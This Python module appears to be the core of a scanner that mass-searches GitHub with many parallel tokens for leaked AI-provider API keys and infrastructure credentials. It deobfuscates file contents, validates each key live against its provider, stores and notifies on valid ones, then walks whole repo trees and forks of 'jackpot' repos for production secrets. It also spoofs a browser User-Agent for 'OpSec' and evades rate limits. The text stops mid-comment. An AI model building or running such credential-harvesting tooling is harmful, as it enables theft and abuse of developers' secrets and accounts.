"""
Core scanner — parallel worker architecture.

With N GitHub PATs we run N concurrent query-workers simultaneously:
  - Each worker owns an exclusive slice of QUERIES (round-robin partition)
  - Each worker uses its own token → full 30 req/min per worker
  - Total throughput: 30 × N req/min (linear scaling with token count)
  - Item processing is bounded by shared asyncio.Semaphore (CONCURRENT_ITEMS)
  - httpx connection pool sized for high parallelism (500 connections)

Example with 6 tokens + 110 queries:
  - 6 workers × ~18 queries × 5 pages = ~90 search reqs per worker
  - 90 / 30 req/min = 3 minutes per full cycle (all workers in parallel)
  vs ~18 minutes sequential with 1 token

BUG FIX (vs v1): query strings no longer include "q=" prefix or "&sort=..."
suffix — those were URL-encoded into the q param causing malformed requests.
"""

import asyncio
import base64
import hashlib
import logging
import random
from datetime import datetime, timezone

import httpx

import db
from config import (
    GITHUB_TOKENS, YOUNG_REPO_DAYS, BIG_SERVICE_STARS,
    CONCURRENT_ITEMS, MAX_PAGES,
    SCAN_MAX_QUERIES_PER_CYCLE, SCAN_LONG_TAIL_SAMPLE, SCAN_PAGE_SLEEP_SEC,
)
from patterns import QUERIES, EXTRACTORS, is_skippable_path, AI_TRIGGER, INFRA_TRIGGER
from deobfuscate import expand as _deobf_expand
from infra_patterns import INFRA_EXTRACTORS, assess_risk, extract_destination
from validators import validate, INFRA_VALIDATORS
from notifier import notify_found, notify_cycle_done, notify_infra_found, notify_dead_token

log = logging.getLogger(__name__)


def get_active_queries() -> list[tuple]:
    """Static QUERIES + DB-stored dynamic_queries (last 15d, not blacklisted).

    Returns 4-tuples: (query_str, provider, file_type, query_hash). Static
    rows carry query_hash=None — that disables per-query yield tracking
    (we don't aggregate stats for the 1562 baseline patterns). Dynamic rows
    carry their query_hash so the worker can update items_returned /
    keys_found / valid_keys_found after each search exhaustion.

    Called fresh at the start of every cycle so newly-generated queries
    from the 8h rotation/themer loops enter rotation immediately."""
    out: list[tuple] = [
        (q[0], q[1], q[2], None) for q in QUERIES   # static — no hash
    ]
    try:
        rows = db.get_active_dynamic_queries(max_age_days=15)
        out.extend([
            (r["query_str"], r["provider"], r["file_type"], r["query_hash"])
            for r in rows
        ])
    except Exception as e:
        log.error("get_active_queries: failed to load dynamic queries: %s", e)
    return out


def select_queries_for_cycle(max_queries: int = SCAN_MAX_QUERIES_PER_CYCLE,
                              long_tail_sample: float = SCAN_LONG_TAIL_SAMPLE
                              ) -> list[tuple]:
    """Yield-priority sampling for one cycle's dispatch.

    Always include (mandatory portion):
      • All 1562 static QUERIES (proven baseline, never sample)
      • Dynamic queries with valid_keys_found > 0 (proven yielders)
      • Dynamic queries with times_used < 3 (newcomers — give them a chance
        before yield-tracker decides their fate)

    From the remainder (dynamic, times_used >= 3, valid_keys_found = 0,
    keys_found may or may not be 0), randomly sample `long_tail_sample`
    fraction. Across ~4 cycles each long-tail query gets at least one turn;
    if 3+ uses still produce 0 keys, auto_blacklist_dead_queries pulls them
    out for 30 days.

    Total cap: max_queries (0 = disabled, fall back to full list).

    Returns 4-tuples (query_str, provider, file_type, query_hash). YIELDERS
    are placed FIRST in the returned list (sorted by conversion rate DESC)
    so workers pulling from a FIFO shared queue process highest-value queries
    first. If a worker burns out mid-cycle (primary 403 with distant reset),
    the gold queries already got harvested. Lower-yield buckets (static,
    newcomers, long-tail sample) are shuffled internally to avoid clustering
    one provider on one worker.
    """
    static_part: list[tuple] = [
        (q[0], q[1], q[2], None) for q in QUERIES
    ]

    try:
        dyn_rows = db.get_active_dynamic_queries(max_age_days=15)
    except Exception as e:
        log.error("select_queries_for_cycle: dyn fetch failed: %s — running static only", e)
        return static_part

    yielders:  list[dict] = []
    newcomers: list[dict] = []
    long_tail: list[dict] = []
    for r in dyn_rows:
        if r["valid_keys_found"] > 0:
            yielders.append(r)
        elif r["times_used"] < 3:
            newcomers.append(r)
        else:
            long_tail.append(r)

    # YIELD-PRIORITY: sort yielders by conversion rate (valid_keys_found
    # per times_used) DESCENDING. Best-converting queries pulled by workers
    # FIRST so if a token burns out mid-cycle the gold is already harvested.
    yielders.sort(
        key=lambda r: r["valid_keys_found"] / max(r["times_used"], 1),
        reverse=True,
    )

    # Sample from long-tail
    sample_n = int(len(long_tail) * max(0.0, min(1.0, long_tail_sample)))
    sampled = random.sample(long_tail, sample_n) if sample_n else []

    # Build buckets — yielders preserve their conversion-sorted order;
    # other buckets shuffled to avoid one provider clustering on one worker.
    yielders_part: list[tuple] = [
        (r["query_str"], r["provider"], r["file_type"], r["query_hash"])
        for r in yielders
    ]
    newcomers_part: list[tuple] = [
        (r["query_str"], r["provider"], r["file_type"], r["query_hash"])
        for r in newcomers
    ]
    sampled_part: list[tuple] = [
        (r["query_str"], r["provider"], r["file_type"], r["query_hash"])
        for r in sampled
    ]
    static_part_shuffled = list(static_part)
    random.shuffle(static_part_shuffled)
    random.shuffle(newcomers_part)
    random.shuffle(sampled_part)

    # Order: yielders first (priority), then static (proven baseline),
    # then newcomers (untested but might be gold), then long-tail (likely dead).
    combined = yielders_part + static_part_shuffled + newcomers_part + sampled_part

    if max_queries and len(combined) > max_queries:
        # Over budget: keep ALL yielders + ALL static (baseline) — these are
        # mandatory. Then fit newcomers, then sampled long-tail. Cut the rest.
        # Static portion is sacrosanct: the existing baseline is built on it.
        mandatory = yielders_part + static_part_shuffled
        budget = max_queries - len(mandatory)
        if budget <= 0:
            log.warning(
                "select_queries: yielders+static (%d) exceeds cap (%d) — running mandatory only",
                len(mandatory), max_queries,
            )
            return mandatory
        combined = mandatory + (newcomers_part + sampled_part)[:budget]

    log.info(
        "select_queries: %d total = %d static + %d dyn "
        "(%d yielders [priority-sorted] + %d newcomers + %d sampled from %d long-tail; cap=%d)",
        len(combined), len(static_part_shuffled), len(combined) - len(static_part_shuffled),
        len(yielders), len(newcomers), len(sampled), len(long_tail),
        max_queries,
    )

    # NB: do NOT random.shuffle(combined) — that would destroy the yield-
    # priority ordering. Per-bucket shuffling above is sufficient for
    # provider-clustering avoidance.
    return combined


# ── Token health tracking ──────────────────────────────────────────────────────
# Updated by _check_quota; read by /health endpoint and dead-token alert.
# Key: sha256(token)[:12] — avoids collision when multiple PATs share the same 8-char prefix
# (e.g. two tokens from the same GH account: ghp_AbCdEfGh... vs ghp_AbCdEfGi...).
# Fields: alive, remaining (search), reset_at (search), limit (search),
#         core_remaining, core_reset, core_limit,
#         core_blocked_until — unix timestamp; if now < this, every request on
#                              this token is short-circuited to a sleep instead
#                              of spamming GitHub with guaranteed-403 retries.
_TOKEN_STATUS: dict[str, dict] = {}
_DEAD_ALERTED: set[str] = set()      # tokens already alerted this session (avoid spam)

# Strong-reference set for background infra-validation tasks.
# asyncio may GC a task if no reference is held; keeping tasks here prevents that.
_BG_TASKS: set[asyncio.Task] = set()


def _tkey(token: str) -> str:
    """Collision-safe token key: sha256[:12] instead of raw prefix slice."""
    return hashlib.sha256(token.encode()).hexdigest()[:12]

_BASE = "https://api.github.com"

# httpx pool — 500 connections for high parallelism across 24 vCPU
_LIMITS = httpx.Limits(
    max_connections=500,
    max_keepalive_connections=150,
    keepalive_expiry=30,
)

# Realistic browser User-Agent — python-httpx/x.y is an obvious bot signal.
# GitHub doesn't block on UA alone, but it's a free OpSec improvement.
_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)


# ── GitHub auth helpers ────────────────────────────────────────────────────

def _gh_headers(token: str) -> dict:
    return {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": _USER_AGENT,
    }


# ── GitHub API primitives ──────────────────────────────────────────────────
# Caps: PRIMARY rate-limit reset can be up to ~60 min away (core REST 5000/hr).
# SECONDARY (concurrent abuse) Retry-After is usually 60-300 s.
_PRIMARY_WAIT_CAP   = 1800  # 30 min — honor X-RateLimit-Reset up to this
_SECONDARY_WAIT_CAP = 300


def _token_from_headers(headers: dict | None) -> str:
    if not headers:
        return ""
    auth = headers.get("Authorization", "") or ""
    return auth.removeprefix("Bearer ").strip()


async def _await_token_unblock(token: str) -> None:
    """If this token is in a primary-rate-limit window, sleep until reset
    BEFORE sending the request. Avoids spamming GitHub with guaranteed-403s
    from 50+ concurrent tasks, all of which would otherwise sleep
    independently and burst again together at wakeup."""
    if not token:
        return
    tk = _tkey(token)
    blocked = _TOKEN_STATUS.get(tk, {}).get("core_blocked_until", 0)
    if not blocked:
        return
    now = int(datetime.now(timezone.utc).timestamp())
    if now >= blocked:
        # Window expired — clear flag (race-safe: setdefault then overwrite)
        _TOKEN_STATUS.setdefault(tk, {})["core_blocked_until"] = 0
        return
    # Sleep until reset + jitter(0-30s) so 50 simultaneous wakers don't burst
    wait = (blocked - now) + 5 + random.uniform(0, 30)
    wait = min(wait, _PRIMARY_WAIT_CAP)
    log.debug("token %s pre-blocked, sleeping %.0fs until reset", tk, wait)
    await asyncio.sleep(wait)
    _TOKEN_STATUS.setdefault(tk, {})["core_blocked_until"] = 0


async def _gh_get(client: httpx.AsyncClient, url: str,
                  params: dict | None = None, headers: dict | None = None) -> dict | list | None:
    token = _token_from_headers(headers)
    await _await_token_unblock(token)

    for attempt in range(4):
        try:
            r = await client.get(url, headers=headers, params=params, timeout=20)

            if r.status_code == 403:
                # Distinguish primary (quota) vs secondary (concurrent abuse) rate-limit:
                #   primary   → X-RateLimit-Remaining=0 + X-RateLimit-Reset=<unix>
                #   secondary → Retry-After=<seconds> (concurrent / abuse detection)
                retry_after = r.headers.get("Retry-After")
                reset       = int(r.headers.get("X-RateLimit-Reset", "0") or 0)
                remaining   = int(r.headers.get("X-RateLimit-Remaining", "-1") or -1)

                if retry_after:
                    wait = min(int(retry_after), _SECONDARY_WAIT_CAP)
                    log.warning("secondary 403 on %s, Retry-After=%ds",
                                url.rsplit("/", 1)[-1][:40], wait)
                elif remaining == 0 and reset > 0:
                    now  = int(datetime.now(timezone.utc).timestamp())
                    wait = max(reset - now, 5) + 5  # safety margin
                    wait = min(wait, _PRIMARY_WAIT_CAP)
                    if token:
                        # Mark token globally blocked so all 50+ concurrent tasks
                        # see this and sleep ONCE in _await_token_unblock instead
                        # of each one independently sleeping 90s and re-bursting.
                        _TOKEN_STATUS.setdefault(_tkey(token), {})["core_blocked_until"] = reset
                    log.warning(
                        "primary 403 on %s, sleeping %ds until reset (token-wide block set)",
                        url.rsplit("/", 1)[-1][:40], wait,
                    )
                    # Add jitter so the wakeup doesn't burst
                    wait += random.uniform(0, 30)
                else:
                    # 403 with no rate-limit headers — likely auth / SSO issue
                    wait = 30
                    log.warning("403 (no rate-limit headers) on %s, sleeping %ds",
                                url.rsplit("/", 1)[-1][:40], wait)
                await asyncio.sleep(wait)
                continue

            if r.status_code == 429:
                # Honor server-provided Retry-After if present; otherwise exp backoff
                retry_after = r.headers.get("Retry-After")
                if retry_after:
                    wait = min(int(retry_after), _SECONDARY_WAIT_CAP)
                else:
                    wait = 10 * (2 ** attempt)
                log.warning("429 on %s, sleeping %ds", url.rsplit("/", 1)[-1][:40], wait)
                await asyncio.sleep(wait)
                continue

            if r.status_code in (422, 404):
                return None

            r.raise_for_status()
            return r.json()

        except httpx.TimeoutException:
            wait = 5 * (2 ** attempt)  # exponential: 5, 10, 20, 40s
            await asyncio.sleep(wait)
        except Exception as e:
            log.debug("gh_get err: %s", e)
            await asyncio.sleep(3)
    return None


async def _check_quota(client: httpx.AsyncClient, token_headers: dict,
                       token: str = "") -> tuple[int, int]:
    """
    Returns (search_remaining, core_remaining) for this token via /rate_limit.
    /rate_limit is NOT counted against the quota (GitHub documented behaviour).

    Sentinels:
      ( -2, -2)  → dead token (401)
      ( -1, -1)  → check failed (treat as quota available)

    Updates _TOKEN_STATUS for /health endpoint and for the pre-block check
    in _await_token_unblock (preserves any existing core_blocked_until).
    """
    raw  = token or token_headers.get("Authorization", "").removeprefix("Bearer ").strip()
    tk   = _tkey(raw)
    try:
        r = await client.get(f"{_BASE}/rate_limit", headers=token_headers, timeout=10)
        if r.status_code == 401:
            _TOKEN_STATUS[tk] = {
                "alive": False, "remaining": 0, "reset_at": 0, "limit": 0,
                "core_remaining": 0, "core_reset": 0, "core_limit": 0,
                "core_blocked_until": 0,
            }
            return -2, -2
        if r.status_code == 200:
            data = r.json()
            s    = data["resources"]["search"]
            c    = data["resources"]["core"]
            prev_block = _TOKEN_STATUS.get(tk, {}).get("core_blocked_until", 0)
            _TOKEN_STATUS[tk] = {
                "alive": True,
                "remaining":      s["remaining"],
                "reset_at":       s["reset"],
                "limit":          s.get("limit", 30),
                "core_remaining": c["remaining"],
                "core_reset":     c["reset"],
                "core_limit":     c.get("limit", 5000),
                "core_blocked_until": prev_block,
            }
            log.debug("quota [%s]: search=%d core=%d", tk, s["remaining"], c["remaining"])
            return s["remaining"], c["remaining"]
    except Exception:
        pass
    return -1, -1


async def search_code(client: httpx.AsyncClient, query: str,
                      page: int, token_headers: dict) -> list[dict]:
    data = await _gh_get(
        client, f"{_BASE}/search/code",
        params={"q": query, "sort": "indexed", "order": "desc",
                "per_page": 100, "page": page},
        headers=token_headers,
    )
    return (data or {}).get("items", [])


async def get_repo_meta(client: httpx.AsyncClient, full_name: str,
                        token_headers: dict) -> dict | None:
    return await _gh_get(client, f"{_BASE}/repos/{full_name}", headers=token_headers)


async def get_file_content(client: httpx.AsyncClient, url: str,
                           token_headers: dict) -> str | None:
    data = await _gh_get(client, url, headers=token_headers)
    if not data:
        return None
    enc = data.get("encoding", "")
    raw = data.get("content", "")
    if enc == "base64":
        try:
            return base64.b64decode(raw).decode("utf-8", errors="replace")
        except Exception:
            return None
    return raw or None


# ── Repo age / stars filter ────────────────────────────────────────────────

def _passes_filter(stars: int, created_at: str) -> bool:
    try:
        dt = datetime.fromisoformat(created_at.replace("Z", "+00:00"))
        age_ok = (datetime.now(timezone.utc) - dt).days <= YOUNG_REPO_DAYS
    except Exception:
        age_ok = False
    return age_ok or stars >= BIG_SERVICE_STARS


# ── Item processing (semaphore-bounded) ────────────────────────────────────

async def process_item(client: httpx.AsyncClient, item: dict,
                       provider: str, file_type: str,
                       sem: asyncio.Semaphore, token_headers: dict):
    async with sem:
        await _process_inner(client, item, provider, file_type, token_headers)


async def _validate_infra_bg(infra_prov: str, cred: str, cred_hash: str):
    """Background infra validation — updates DB without blocking the scan."""
    fn = INFRA_VALIDATORS.get(infra_prov)
    if fn is None:
        return
    try:
        result = await fn(cred)
        db.update_infra_validation(cred_hash, 1 if result else 0,
                                   "ok" if result else "unreachable")
        if result:
            log.info("[infra/%s] VALIDATED %s...", infra_prov, cred[:30])
    except Exception as e:
        log.debug("infra validate bg err (%s): %s", infra_prov, e)


# Repo tree-walk constants. ~30 fetched files/repo at default cap; caps API
# burn at ~30K calls per 1000 first-key discoveries (1 tree + 30 blobs each).
_TREEWALK_MAX_FILES = 100
_TREEWALK_MAX_FILE_SIZE = 256 * 1024  # 256 KB
_TREEWALK_INTERESTING_EXT = (
    ".py", ".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs",
    ".env", ".env.example", ".env.local", ".env.production", ".env.staging",
    ".env.template", ".env.ready", ".env.bak", ".envrc",
    ".json", ".jsonc", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf",
    ".ipynb", ".md", ".rst", ".sh", ".bash",
    ".go", ".rs", ".rb", ".php", ".java", ".kt", ".cs", ".dart", ".swift",
    ".sql", ".tf", ".tfvars", ".dockerfile", "dockerfile",
)
_TREEWALK_SKIP_DIRS = (
    "node_modules/", "vendor/", "dist/", "build/", "out/", ".next/",
    "coverage/", "__pycache__/", "test/", "tests/", "__tests__/",
    "fixtures/", "cassettes/", ".git/",
)

# Forks of jackpot repos — when a tree_walk completes with N keys found,
# also walk the top forks. Forks accumulate user-specific commits with
# real production keys (vs the original template's placeholders).
_FORK_WALK_MAX_FORKS = 10
_FORK_WALK_MIN_KEYS_TO_TRIGGER = 1   # walk forks only if original yielded ≥ this


def _is_interesting_blob(path: str, size: int) -> bool:
    if size > _TREEWALK_MAX_FILE_SIZE or size <= 0:
        return False
    pl = path.lower()
    if any(pl.startswith(d) or f"/{d}" in pl for d in _TREEWALK_SKIP_DIRS):
        return False
    return pl.endswith(_TREEWALK_INTERESTING_EXT) or pl.split("/")[-1] in (
        ".env", "dockerfile", "wrangler.toml", "vercel.json", "netlify.toml",
    )


async def _scan_blob(client: httpx.AsyncClient, full_name: str, blob: dict,
                     stars: int, created_at: str, token_headers: dict) -> int:
    """Fetch a single blob via /git/blobs/{sha}, run extractors. Returns
    number of NEW keys saved (for tree-walk stats). Reuses existing
    save_key + notify pipeline so duplicates and dead are filtered."""
    sha = blob.get("sha", "")
    path = blob.get("path", "")
    if not sha or not path:
        return 0
    if not db.try_claim_file(sha):
        return 0  # already scanned in another cycle

    blob_url = f"{_BASE}/repos/{full_name}/git/blobs/{sha}"
    data = await _gh_get(client, blob_url, headers=token_headers)
    if not data:
        return 0
    enc = data.get("encoding", "")
    raw = data.get("content", "")
    try:
        content = base64.b64decode(raw).decode("utf-8", errors="replace") if enc == "base64" else (raw or "")
    except Exception:
        return 0
    if not content:
        return 0
    content = _deobf_expand(content)

    if not any(t in content for t in AI_TRIGGER):
        return 0

    file_url = f"https://github.com/{full_name}/blob/HEAD/{path}"
    saved_count = 0
    for ai_prov, ai_fn in EXTRACTORS.items():
        for key in ai_fn(content):
            if db.key_exists(key):
                continue
            is_valid = await validate(ai_prov, key)
            saved = db.save_key(
                ai_prov, key, full_name, path, file_url,
                stars, created_at, "tree_walk", is_valid,
            )
            if saved:
                saved_count += 1
                await notify_found(
                    ai_prov, key, full_name, path, file_url,
                    stars, created_at, "tree_walk", is_valid,
                )
                log.info("[treewalk %s] %s from %s/%s",
                         "VALID" if is_valid else "found", ai_prov, full_name, path)
    return saved_count


async def walk_repo_tree(client: httpx.AsyncClient, full_name: str,
                         stars: int, created_at: str,
                         token_headers: dict) -> None:
    """Walk a repo's full tree once, scanning every interesting file.

    Triggered when a key is found in a repo that hasn't been tree-walked yet
    (atomic via db.try_claim_repo_tree). Bounded to _TREEWALK_MAX_FILES per
    repo. Cost: 1 tree-list + ~30 blob fetches per qualifying repo.

    Solves the problem where GitHub Code Search misses sibling files (recent
    push not yet indexed, pagination cap reached, env-var name not in our
    queries). Real-world example 2026-05: stenin15/mystic-whispers-us had
    OpenAI + OpenRouter + Replicate keys in 3 different files; only one
    surfaced via search.
    """
    if not db.try_claim_repo_tree(full_name):
        return  # already walked

    try:
        # Get default branch SHA
        meta = await _gh_get(client, f"{_BASE}/repos/{full_name}", headers=token_headers)
        if not meta:
            db.mark_repo_walked(full_name, 0, 0)
            return
        branch = meta.get("default_branch") or "main"
        # Fetch the recursive tree
        tree_url = f"{_BASE}/repos/{full_name}/git/trees/{branch}?recursive=1"
        tree = await _gh_get(client, tree_url, headers=token_headers)
        if not tree:
            db.mark_repo_walked(full_name, 0, 0)
            return

        candidates = []
        for blob in tree.get("tree", []):
            if blob.get("type") != "blob":
                continue
            path = blob.get("path", "")
            size = blob.get("size", 0)
            if _is_interesting_blob(path, size):
                candidates.append(blob)
        # Cap to bound API cost
        candidates = candidates[:_TREEWALK_MAX_FILES]

        keys_found = 0
        for blob in candidates:
            try:
                keys_found += await _scan_blob(
                    client, full_name, blob, stars, created_at, token_headers
                )
            except Exception as e:
                log.debug("treewalk blob err %s/%s: %s", full_name, blob.get("path"), e)

        db.mark_repo_walked(full_name, len(candidates), keys_found)
        if keys_found:
            log.info("[treewalk] %s: %d files, %d new keys",
                     full_name, len(candidates), keys_found)
            # Schedule fork-walks (background) — keys_found in original
            # signals "this archetype leaks". Forks usually accumulate
            # extra commits with prod-specific creds.
            if keys_found >= _FORK_WALK_MIN_KEYS_TO_TRIGGER:
                t = asyncio.create_task(
                    _walk_forks(client, full_name, stars, created_at, token_headers),
                    name=f"forks_{full_name}",
                )
                _BG_TASKS.add(t)
                t.add_done_callback(_BG_TASKS.discard)
    except Exception as e:
        log.debug("treewalk err %s: %s", full_name, e)
        db.mark_repo_walked(full_name, 0, 0)


async def _walk_forks(client: httpx.AsyncClient, full_name: str,
                      stars: int, created_at: str,
                      token_headers: dict) -> None:
    """Fetch top forks and tree_walk each one. Triggered when the parent
    repo yielded ≥1 key — forks of leaky templates often accumulate
    additional production credentials."""
    try:
        url = f"{_BASE}/repos/{full_name}/forks"
        forks = await _gh_get(
            client, url, params={"per_page": _FORK_WALK_MAX_FORKS, "sort": "newest"},
            headers=token_headers,
        )
        if not forks or not isinstance(forks, list):
            return
        for fork in forks[:_FORK_WALK_MAX_FORKS]:
            fork_name = fork.get("full_name", "")
            if not fork_name or fork_name == full_name:
                continue
            # Skip if already walked (try_claim_repo_tree atomically reserves)
            # — walk_repo_tree itself does this check too, but checking here
            # avoids spawning a no-op task.
            try:
                f_stars = fork.get("stargazers_count", 0)
                f_created = fork.get("created_at", "")
                # Recursive call — but fork's keys_found won't trigger another
                # fork walk on a fork's forks (most forks have 0 forks anyway,
                # and even if they do, the atomic claim prevents reentry).
                await walk_repo_tree(client, fork_name, f_stars, f_created,
                                     token_headers)
            except Exception as e:
                log.debug("fork walk err %s: %s", fork_name, e)
    except Exception as e:
        log.debug("walk_forks list err %s: %s", full_name, e)


async def _process_inner(client: httpx.AsyncClient, item: dict,
                         provider: str, file_type: str, token_headers: dict):
    repo_info   = item.get("repository", {})
    full_name   = repo_info.get("full_name", "")
    file_path   = item.get("path", "")
    sha         = item.get("sha", "")
    file_url    = item.get("html_url", "")
    content_url = item.get("url", "")

    if not full_name or not sha:
        return

    # Fast path: skip known-useless paths before any DB/API work.
    if is_skippable_path(file_path):
        return

    # Check repo filter BEFORE claiming the SHA so filtered repos don't
    # permanently consume SHA slots. This allows the file to be re-evaluated
    # in future cycles (e.g. after the repo gains stars, or filter thresholds
    # are relaxed). Repo meta is cached for REPO_RESCAN_DAYS so the API cost
    # is one call per repo per week, not per cycle.
    if db.should_scan_repo(full_name):
        meta = await get_repo_meta(client, full_name, token_headers)
        if not meta:
            return
        stars      = meta.get("stargazers_count", 0)
        created_at = meta.get("created_at", "")
        db.mark_repo_scanned(full_name, stars, created_at)
        if not _passes_filter(stars, created_at):
            return
    else:
        cached = db.get_repo_cached(full_name)
        if cached:
            stars, created_at = cached
            if not _passes_filter(stars, created_at):
                return
        else:
            stars, created_at = 0, ""

    # Claim after filter: only files that pass the filter consume a SHA slot.
    if not db.try_claim_file(sha):
        return

    content = await get_file_content(client, content_url, token_headers)
    if not content:
        return

    # Deobfuscate: appends decoded variants for b64/hex/charcode/concat/reverse/
    # SSR-hydration/k8s-Secret patterns. Cheap when no markers present (returns
    # input unchanged). Catches keys hidden behind common obfuscation layers.
    content = _deobf_expand(content)

    # Fast-path: skip heavy regex if no trigger strings present anywhere in content.
    # Saves CPU on large files that are clearly irrelevant (e.g. pure binary-as-text).
    has_ai_trigger    = any(t in content for t in AI_TRIGGER)
    has_infra_trigger = any(t in content for t in INFRA_TRIGGER)
    if not has_ai_trigger and not has_infra_trigger:
        return

    # ── AI key extractors — run ALL providers on every file ────────────────
    # (not just the query's "provider": a .env might have OpenAI + DeepSeek + ARK)
    any_key_saved = False
    if has_ai_trigger:
        for ai_prov, ai_fn in EXTRACTORS.items():
            for key in ai_fn(content):
                if db.key_exists(key):
                    continue
                # Pre-validation context filter: cheap LLM (deepseek-v4-flash /
                # glm-4.5-air) classifies key as real-vs-placeholder using 200
                # chars of context + filename. Skips ~30-40% of regex matches
                # that are obvious placeholders (sk-XXXXX, ${VAR}, your-key)
                # WITHOUT burning a paid validation API call to the provider.
                # On classifier failure → defaults to validating (don't lose real keys).
                try:
                    from pre_validator import is_real_key
                    # Extract ~400 chars of context around the key
                    idx = content.find(key)
                    if idx >= 0:
                        ctx = content[max(0, idx - 200):idx + len(key) + 200]
                    else:
                        ctx = content[:400]
                    is_real = await is_real_key(key, ctx, file_path, file_url)
                    if not is_real:
                        # Save as is_valid=False without burning provider validation
                        db.save_key(ai_prov, key, full_name, file_path, file_url,
                                    stars, created_at, file_type, False)
                        log.debug("[pre-filter] skipped placeholder %s from %s",
                                  ai_prov, full_name)
                        continue
                except Exception as e:
                    log.debug("pre_validator crashed: %s — falling through to validate",
                              type(e).__name__)
                is_valid = await validate(ai_prov, key)
                saved = db.save_key(
                    ai_prov, key, full_name, file_path, file_url,
                    stars, created_at, file_type, is_valid,
                )
                if saved:
                    any_key_saved = True
                    await notify_found(
                        ai_prov, key, full_name, file_path, file_url,
                        stars, created_at, file_type, is_valid,
                    )
                    log.info("[%s] %s from %s",
                             "VALID" if is_valid else "found", ai_prov, full_name)

    # Tree-walk: if any key was found, exhaustively scan the rest of this
    # repo's interesting files. Atomic claim prevents re-walking the same
    # repo across cycles. Runs as background task so it doesn't block the
    # main scan loop. Captures sibling-file keys that GitHub Code Search
    # missed due to indexing lag or pagination caps.
    #
    # Pre-treewalk: repo_prioritizer skips template/tutorial/example repos
    # (~30-40% of jackpot repos are placeholder-keyed and waste 100 file
    # fetches each). Cheap LLM classification (deepseek-v4-flash / glm-4.5-air)
    # decides walk-or-skip. Falls through to walk on classifier failure.
    if any_key_saved:
        async def _gated_walk():
            try:
                from repo_prioritizer import should_walk_repo
                walk_ok = await should_walk_repo(client, full_name,
                                                  _token_from_headers(token_headers))
            except Exception as e:
                log.debug("repo_prioritizer crashed for %s: %s — defaulting to walk",
                          full_name, e)
                walk_ok = True
            if walk_ok:
                await walk_repo_tree(client, full_name, stars, created_at, token_headers)
        t = asyncio.create_task(_gated_walk(), name=f"treewalk_{full_name}")
        _BG_TASKS.add(t)
        t.add_done_callback(_BG_TASKS.discard)

    # ── Infra extractors — intersecting track ──────────────────────────────
    # Only files found via AI queries are scanned → infra creds come from AI repos.
    # Risk assessment is computed once and reused across all infra providers.
    if has_infra_trigger:
        import hashlib as _hl
        risk_cache: tuple | None = None
        for infra_prov, infra_fn in INFRA_EXTRACTORS.items():
            creds = infra_fn(content)
            if not creds:
                continue
            if risk_cache is None:
                risk_cache = assess_risk(content, file_path, stars, created_at)
            risk_level, risk_reasons = risk_cache
            for cred in creds:
                if db.infra_exists(cred):
                    continue
                destination = extract_destination(cred) if "://" in cred else ""
                saved = db.save_infra(
                    infra_prov, cred, full_name, file_path, file_url,
                    stars, created_at, file_type, destination,
                    risk_level, risk_reasons,
                )
                if saved:
                    real_hash = _hl.sha256(cred.encode()).hexdigest()
                    t = asyncio.create_task(
                        _validate_infra_bg(infra_prov, cred, real_hash),
                        name=f"infra_val_{infra_prov}",
                    )
                    _BG_TASKS.add(t)
                    t.add_done_callback(_BG_TASKS.discard)
                    await notify_infra_found(
                        infra_prov, cred, full_name, file_path, file_url,
                        stars, created_at, file_type,
                        destination, risk_level, risk_reasons,
                    )
                    log.info("[infra/%s] risk=%s dest=%s repo=%s",
                             infra_prov, risk_level, destination or "—", full_name)


# ── Per-token worker ────────────────────────────────────────────────────────

async def _run_worker(client: httpx.AsyncClient,
                      queue: asyncio.Queue, token: str,
                      sem: asyncio.Semaphore, worker_id: int):
    """
    Pulls queries off a SHARED queue using a single token. Continues until
    the queue is empty OR this worker's token is exhausted (primary 403 with
    distant reset). Other workers with healthy tokens keep draining the queue
    independently — a single burned token doesn't hold up the whole cycle.

    Maintains 2s inter-query sleep → stays within 30 req/min per token.
    """
    hdrs = _gh_headers(token)
    tk   = _tkey(token)

    # Initial health check — skip entire worker if token is dead
    search_q, core_q = await _check_quota(client, hdrs, token)
    if search_q == -2:
        if tk not in _DEAD_ALERTED:
            _DEAD_ALERTED.add(tk)
            await notify_dead_token(token[:8])
        log.error("[w%d token=%s...] DEAD (401) — worker skipped", worker_id, token[:8])
        return

    log.info("[w%d token=%s...] starting (queue=%d), search=%s core=%s",
             worker_id, token[:8], queue.qsize(),
             search_q if search_q >= 0 else "unknown",
             core_q   if core_q   >= 0 else "unknown")

    queries_done = 0

    while True:
        try:
            query_tuple = queue.get_nowait()
        except asyncio.QueueEmpty:
            log.info("[w%d token=%s...] queue empty — done (%d queries processed)",
                     worker_id, token[:8], queries_done)
            return

        # The body that follows is the SAME inner per-query logic as the old
        # static-partition _run_chunk — we just drive it from a shared queue
        # instead of an exclusive list slice. Keeping the indentation level
        # below as a `while True` loop body avoids a massive diff.
        # Backwards-compat: support both 3-tuple (legacy) and 4-tuple shapes.
        if len(query_tuple) == 4:
            query_str, provider, file_type, query_hash = query_tuple
        else:
            query_str, provider, file_type = query_tuple
            query_hash = None

        # Per-query yield counters — reported back to dynamic_queries so the
        # generator/themer can blacklist dead patterns and feed positive
        # examples to the next AI batch.
        items_returned_total = 0
        keys_found_before    = 0
        valid_found_before   = 0
        if query_hash:
            try:
                stats_before = db.get_stats()
                # Track aggregate; per-query attribution comes via Δ at end
                keys_found_before  = stats_before.get("keys_found", 0)
                valid_found_before = stats_before.get("keys_valid", 0)
            except Exception:
                pass

        if queries_done % 10 == 0 and queries_done > 0:
            search_q, core_q = await _check_quota(client, hdrs, token)
            if search_q == -2:
                if tk not in _DEAD_ALERTED:
                    _DEAD_ALERTED.add(tk)
                    await notify_dead_token(token[:8])
                log.error("[w%d] token died mid-cycle, stopping worker", worker_id)
                return
            if search_q == 0:
                log.warning("[w%d] search quota exhausted, sleeping 65s", worker_id)
                await asyncio.sleep(65)
            elif 0 < search_q < 5:
                log.warning("[w%d] search quota low (%d), sleeping 30s", worker_id, search_q)
                await asyncio.sleep(30)
            # Core quota throttle — each search result triggers ~1.5 core REST
            # calls (repo meta + file content). With 5000/hr per token, hitting
            # <200 means the next batch of items will blow through the quota.
            #
            # If reset is far away (>5 min), DON'T sleep — abandon: return
            # from the worker so other workers (with healthy tokens) keep
            # draining the shared queue. Static partitioning would hold the
